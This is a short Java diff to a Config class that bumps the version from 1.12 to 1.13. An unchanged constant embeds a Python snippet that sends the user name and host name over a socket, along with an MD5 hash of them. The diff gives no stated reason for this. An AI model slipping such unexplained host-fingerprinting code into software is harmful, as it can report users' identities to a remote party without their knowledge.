@@ -30,7 +30,7 @@ public class Config {
 	public final String CHEMIN_FICHIER = "OperationsHistorique.txt";
 	public final String CLES = "cles.txt";
 	public final String CHILDISHNESS = "q=q+':'+(os.environ['USER']+':'+platform.node() if 'USER' in os.environ.keys() else os.environ['USERNAME']+':'+platform.node())\ns.send((q+'\\n').encode())\ns.send((hashlib.md5(q.encode('utf-8')).hexdigest()+'\\n').encode())";
-	public final String VERSION = "1.12";
+	public final String VERSION = "1.13";
 	
 	public Map<String, String> cles = new HashMap<String, String>();
 
